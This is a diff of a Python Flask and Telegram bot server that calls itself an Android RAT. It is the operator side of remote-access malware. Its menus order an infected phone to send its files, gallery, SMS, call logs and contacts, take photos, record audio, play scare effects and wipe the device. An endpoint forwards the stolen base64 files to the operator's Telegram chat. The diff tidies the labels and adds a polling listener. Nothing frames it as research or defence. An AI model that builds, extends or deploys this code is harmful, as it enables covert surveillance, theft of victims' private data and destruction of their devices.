@@ -1,10 +1,21 @@
 import os
+import sys
 import time
 import threading
 import requests
 import json
 import base64
 from flask import Flask, request, jsonify
+
+# ========== ФИКС ДЛЯ PYTHON 3.14 ==========
+# Модуль imghdr удалён, подменяем заглушкой
+if 'imghdr' not in sys.modules:
+    class FakeImghdr:
+        def what(self, data):
+            return None
+    sys.modules['imghdr'] = FakeImghdr()
+
+# ========== ИМПОРТЫ ==========
 from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Updater, CommandHandler, CallbackQueryHandler
 
@@ -16,6 +27,17 @@ CHAT_ID = '7803661441'
 
 bot = Bot(token=BOT_TOKEN)
 latest_command = {"cmd": "none", "params": ""}
+
+print("✅ Бот запускается...", flush=True)
+
+# Отправляем тест при старте
+try:
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    data = {'chat_id': CHAT_ID, 'text': '✅ RAT сервер запущен!'}
+    r = requests.post(url, data=data, timeout=5)
+    print(f"✅ Тест отправлен, ответ: {r.status_code}", flush=True)
+except Exception as e:
+    print(f"❌ Ошибка при тесте: {e}", flush=True)
 
 # ========== КНОПКИ TELEGRAM ==========
 def main_menu():
@@ -32,8 +54,8 @@ def main_menu():
         [InlineKeyboardButton("💬 СМС", callback_data='sms')],
         [InlineKeyboardButton("📞 ЗВОНКИ", callback_data='calls')],
         [InlineKeyboardButton("👥 КОНТАКТЫ", callback_data='contacts')],
-        [InlineKeyboardButton("💀 УНИЧТОЖИТЬ ТЕЛЕФОН", callback_data='wipe')],
-        [InlineKeyboardButton("⚙️ ДРУГИЕ ФУНКЦИИ", callback_data='menu_other')]
+        [InlineKeyboardButton("💀 УНИЧТОЖИТЬ", callback_data='wipe')],
+        [InlineKeyboardButton("⚙️ ДРУГИЕ", callback_data='menu_other')]
     ]
     return InlineKeyboardMarkup(keyboard)
 
@@ -57,9 +79,9 @@ def camera_menu():
 
 def mic_menu():
     keyboard = [
-        [InlineKeyboardButton("🎙️ 5 СЕКУНД", callback_data='audio_5')],
-        [InlineKeyboardButton("🎙️ 10 СЕКУНД", callback_data='audio_10')],
-        [InlineKeyboardButton("🎙️ 30 СЕКУНД", callback_data='audio_30')],
+        [InlineKeyboardButton("🎙️ 5 СЕК", callback_data='audio_5')],
+        [InlineKeyboardButton("🎙️ 10 СЕК", callback_data='audio_10')],
+        [InlineKeyboardButton("🎙️ 30 СЕК", callback_data='audio_30')],
         [InlineKeyboardButton("◀️ НАЗАД", callback_data='back_main')]
     ]
     return InlineKeyboardMarkup(keyboard)
@@ -70,7 +92,7 @@ def sounds_menu():
         [InlineKeyboardButton("👻 СТРАШНЫЙ ЗВУК", callback_data='sound_scary')],
         [InlineKeyboardButton("🎵 RICKROLL", callback_data='sound_rickroll')],
         [InlineKeyboardButton("🔔 УВЕДОМЛЕНИЕ", callback_data='sound_notify')],
-        [InlineKeyboardButton("📢 ГОЛОСОВОЕ СООБЩЕНИЕ", callback_data='sound_tts')],
+        [InlineKeyboardButton("📢 ГОЛОСОВОЕ", callback_data='sound_tts')],
         [InlineKeyboardButton("◀️ НАЗАД", callback_data='back_main')]
     ]
     return InlineKeyboardMarkup(keyboard)
@@ -81,16 +103,16 @@ def scary_menu():
         [InlineKeyboardButton("📺 СТРАШНОЕ ВИДЕО", callback_data='scary_video')],
         [InlineKeyboardButton("🔊 ВЗРЫВ", callback_data='scary_explosion')],
         [InlineKeyboardButton("💀 СООБЩЕНИЕ О СМЕРТИ", callback_data='scary_death')],
-        [InlineKeyboardButton("🕷️ ПАУК НА ЭКРАНЕ", callback_data='scary_spider')],
+        [InlineKeyboardButton("🕷️ ПАУК", callback_data='scary_spider')],
         [InlineKeyboardButton("◀️ НАЗАД", callback_data='back_main')]
     ]
     return InlineKeyboardMarkup(keyboard)
 
 def other_menu():
     keyboard = [
-        [InlineKeyboardButton("🔋 УРОВЕНЬ ЗАРЯДА", callback_data='battery')],
-        [InlineKeyboardButton("🌐 IP АДРЕС", callback_data='ip')],
-        [InlineKeyboardButton("📱 МОДЕЛЬ ТЕЛЕФОНА", callback_data='device_info')],
+        [InlineKeyboardButton("🔋 ЗАРЯД", callback_data='battery')],
+        [InlineKeyboardButton("🌐 IP", callback_data='ip')],
+        [InlineKeyboardButton("📱 МОДЕЛЬ", callback_data='device_info')],
         [InlineKeyboardButton("📡 ОТКРЫТЬ САЙТ", callback_data='open_url')],
         [InlineKeyboardButton("📢 СКАЗАТЬ ТЕКСТ", callback_data='say_text')],
         [InlineKeyboardButton("◀️ НАЗАД", callback_data='back_main')]
@@ -101,10 +123,6 @@ def other_menu():
 def start(update, context):
     update.message.reply_text(
         "🤖 ANDROID RAT АКТИВИРОВАН\n\n"
-        "📱 Управление телефоном жертвы\n"
-        "🔐 Кража данных\n"
-        "👻 Страшные эффекты\n"
-        "💀 Уничтожение системы\n\n"
         "👇 Используйте кнопки",
         reply_markup=main_menu()
     )
@@ -113,47 +131,46 @@ def handle_callback(update, context):
     query = update.callback_query
     query.answer()
     data = query.data
-    
+
     if data == 'back_main':
         query.edit_message_text("🤖 ГЛАВНОЕ МЕНЮ", reply_markup=main_menu())
-    
-    # МЕНЮ
+
     elif data == 'menu_files':
-        query.edit_message_text("📁 ВЫБЕРИТЕ ПАПКУ", reply_markup=files_menu())
+        query.edit_message_text("📁 ПАПКИ", reply_markup=files_menu())
     elif data == 'menu_camera':
-        query.edit_message_text("📸 ВЫБЕРИТЕ КАМЕРУ", reply_markup=camera_menu())
+        query.edit_message_text("📸 КАМЕРА", reply_markup=camera_menu())
     elif data == 'menu_mic':
-        query.edit_message_text("🎙️ ВЫБЕРИТЕ ДЛИТЕЛЬНОСТЬ", reply_markup=mic_menu())
+        query.edit_message_text("🎙️ МИКРОФОН", reply_markup=mic_menu())
     elif data == 'menu_sounds':
-        query.edit_message_text("🔊 ВЫБЕРИТЕ ЗВУК", reply_markup=sounds_menu())
+        query.edit_message_text("🔊 ЗВУКИ", reply_markup=sounds_menu())
     elif data == 'menu_scary':
-        query.edit_message_text("👻 СТРАШНЫЕ ЭФФЕКТЫ", reply_markup=scary_menu())
+        query.edit_message_text("👻 СТРАШНОЕ", reply_markup=scary_menu())
     elif data == 'menu_other':
-        query.edit_message_text("⚙️ ДРУГИЕ ФУНКЦИИ", reply_markup=other_menu())
-    
-    # ФАЙЛЫ
+        query.edit_message_text("⚙️ ДРУГИЕ", reply_markup=other_menu())
+
+    # Файлы
     elif data == 'files_sdcard':
         set_command("files", "/sdcard")
-        query.edit_message_text("📁 ЗАПРОС ОТПРАВЛЕН", reply_markup=main_menu())
+        query.edit_message_text("✅ ОТПРАВЛЕНО", reply_markup=main_menu())
     elif data == 'files_dcim':
         set_command("files", "/sdcard/DCIM")
-        query.edit_message_text("📸 ЗАПРОС ОТПРАВЛЕН", reply_markup=main_menu())
+        query.edit_message_text("✅ ОТПРАВЛЕНО", reply_markup=main_menu())
     elif data == 'files_download':
         set_command("files", "/sdcard/Download")
-        query.edit_message_text("📥 ЗАПРОС ОТПРАВЛЕН", reply_markup=main_menu())
+        query.edit_message_text("✅ ОТПРАВЛЕНО", reply_markup=main_menu())
     elif data == 'files_documents':
         set_command("files", "/sdcard/Documents")
-        query.edit_message_text("📄 ЗАПРОС ОТПРАВЛЕН", reply_markup=main_menu())
-    
-    # КАМЕРА
+        query.edit_message_text("✅ ОТПРАВЛЕНО", reply_markup=main_menu())
+
+    # Камера
     elif data == 'photo_front':
         set_command("photo", "front")
-        query.edit_message_text("📸 ФОТО ЗАПРОШЕНО", reply_markup=main_menu())
+        query.edit_message_text("✅ ФОТО ЗАПРОШЕНО", reply_markup=main_menu())
     elif data == 'photo_back':
         set_command("photo", "back")
-        query.edit_message_text("📷 ФОТО ЗАПРОШЕНО", reply_markup=main_menu())
-    
-    # МИКРОФОН
+        query.edit_message_text("✅ ФОТО ЗАПРОШЕНО", reply_markup=main_menu())
+
+    # Микрофон
     elif data == 'audio_5':
         set_command("audio", "5")
         query.edit_message_text("🎙️ ЗАПИСЬ 5 СЕК", reply_markup=main_menu())
@@ -163,8 +180,8 @@ def handle_callback(update, context):
     elif data == 'audio_30':
         set_command("audio", "30")
         query.edit_message_text("🎙️ ЗАПИСЬ 30 СЕК", reply_markup=main_menu())
-    
-    # ЗВУКИ
+
+    # Звуки
     elif data == 'sound_siren':
         set_command("sound", "siren")
         query.edit_message_text("🔊 СИРЕНА", reply_markup=main_menu())
@@ -180,8 +197,8 @@ def handle_callback(update, context):
     elif data == 'sound_tts':
         set_command("sound", "tts")
         query.edit_message_text("📢 ГОЛОСОВОЕ", reply_markup=main_menu())
-    
-    # СТРАШНОЕ
+
+    # Страшное
     elif data == 'scary_image':
         set_command("scary", "image")
         query.edit_message_text("👻 СТРАШНАЯ КАРТИНКА", reply_markup=main_menu())
@@ -197,8 +214,8 @@ def handle_callback(update, context):
     elif data == 'scary_spider':
         set_command("scary", "spider")
         query.edit_message_text("🕷️ ПАУК", reply_markup=main_menu())
-    
-    # КРАЖА
+
+    # Кража
     elif data == 'gallery':
         set_command("gallery", "")
         query.edit_message_text("📸 ГАЛЕРЕЯ", reply_markup=main_menu())
@@ -220,11 +237,11 @@ def handle_callback(update, context):
     elif data == 'contacts':
         set_command("contacts", "")
         query.edit_message_text("👥 КОНТАКТЫ", reply_markup=main_menu())
-    
-    # ДРУГИЕ
+
+    # Другие
     elif data == 'battery':
         set_command("battery", "")
-        query.edit_message_text("🔋 УРОВЕНЬ ЗАРЯДА", reply_markup=main_menu())
+        query.edit_message_text("🔋 ЗАРЯД", reply_markup=main_menu())
     elif data == 'ip':
         set_command("ip", "")
         query.edit_message_text("🌐 IP", reply_markup=main_menu())
@@ -237,8 +254,8 @@ def handle_callback(update, context):
     elif data == 'say_text':
         set_command("say_text", "")
         query.edit_message_text("📢 СКАЗАТЬ", reply_markup=main_menu())
-    
-    # УНИЧТОЖЕНИЕ
+
+    # Уничтожение
     elif data == 'wipe':
         set_command("wipe", "")
         query.edit_message_text("💀 УНИЧТОЖЕНИЕ", reply_markup=main_menu())
@@ -247,10 +264,49 @@ def set_command(cmd, params):
     latest_command["cmd"] = cmd
     latest_command["params"] = params
 
-# ========== FLASK API ДЛЯ ANDROID ==========
+# ========== ФОНОВЫЙ СЛУШАТЕЛЬ ДЛЯ ТЕЛЕГРАМ ==========
+def listen():
+    last_id = 0
+    while True:
+        try:
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
+            params = {'offset': last_id + 1, 'timeout': 5}
+            r = requests.get(url, params=params, timeout=6).json()
+            if r.get('ok'):
+                for upd in r['result']:
+                    last_id = upd['update_id']
+                    if 'message' in upd and upd['message']['chat']['id'] == int(CHAT_ID):
+                        text = upd['message'].get('text', '')
+                        if text == '/start':
+                            send_msg(CHAT_ID, "✅ Бот активен! Нажми /menu")
+                        elif text == '/menu':
+                            send_msg(CHAT_ID, "🤖 ГЛАВНОЕ МЕНЮ", reply_markup=main_menu())
+                        else:
+                            send_msg(CHAT_ID, f"❌ Неизвестно: {text}")
+        except Exception as e:
+            print(f"Ошибка listen: {e}", flush=True)
+        time.sleep(1)
+
+def send_msg(chat, text, reply_markup=None):
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        data = {'chat_id': chat, 'text': text}
+        if reply_markup:
+            data['reply_markup'] = json.dumps(reply_markup.to_dict())
+        requests.post(url, data=data, timeout=5)
+    except:
+        pass
+
+threading.Thread(target=listen, daemon=True).start()
+
+# ========== FLASK API ==========
 @app.route('/')
 def home():
     return "✅ RAT сервер работает!", 200
+
+@app.route('/health')
+def health():
+    return "OK", 200
 
 @app.route('/get_command', methods=['GET'])
 def get_command():
@@ -267,47 +323,25 @@ def send_data():
     if data:
         msg_type = data.get('type', 'data')
         content = data.get('content', '')
-        
-        if msg_type == 'file':
-            filename = data.get('filename', 'file')
+        if msg_type in ['file', 'photo', 'audio']:
             filedata = base64.b64decode(content)
+            filename = data.get('filename', f'{msg_type}_{int(time.time())}')
             filepath = f"/tmp/{filename}"
             with open(filepath, 'wb') as f:
                 f.write(filedata)
             with open(filepath, 'rb') as f:
-                bot.send_document(chat_id=CHAT_ID, document=f, filename=filename)
-            os.remove(filepath)
-        elif msg_type == 'photo':
-            filedata = base64.b64decode(content)
-            filepath = f"/tmp/photo_{int(time.time())}.jpg"
-            with open(filepath, 'wb') as f:
-                f.write(filedata)
-            with open(filepath, 'rb') as f:
-                bot.send_photo(chat_id=CHAT_ID, photo=f)
-            os.remove(filepath)
-        elif msg_type == 'audio':
-            filedata = base64.b64decode(content)
-            filepath = f"/tmp/audio_{int(time.time())}.wav"
-            with open(filepath, 'wb') as f:
-                f.write(filedata)
-            with open(filepath, 'rb') as f:
-                bot.send_audio(chat_id=CHAT_ID, audio=f)
+                if msg_type == 'photo':
+                    bot.send_photo(chat_id=CHAT_ID, photo=f)
+                elif msg_type == 'audio':
+                    bot.send_audio(chat_id=CHAT_ID, audio=f)
+                else:
+                    bot.send_document(chat_id=CHAT_ID, document=f, filename=filename)
             os.remove(filepath)
         else:
             bot.send_message(chat_id=CHAT_ID, text=f"📱 {msg_type.upper()}:\n{content[:3000]}")
     return "OK", 200
 
-# ========== ОСНОВНОЙ ЗАПУСК ==========
-def main():
-    updater = Updater(BOT_TOKEN, use_context=True)
-    dp = updater.dispatcher
-    dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(CallbackQueryHandler(handle_callback))
-    
-    threading.Thread(target=updater.start_polling, daemon=True).start()
-    
+# ========== ЗАПУСК ==========
+if __name__ == '__main__':
     port = int(os.environ.get('PORT', 10000))
     app.run(host='0.0.0.0', port=port)
-
-if __name__ == '__main__':
-    main()
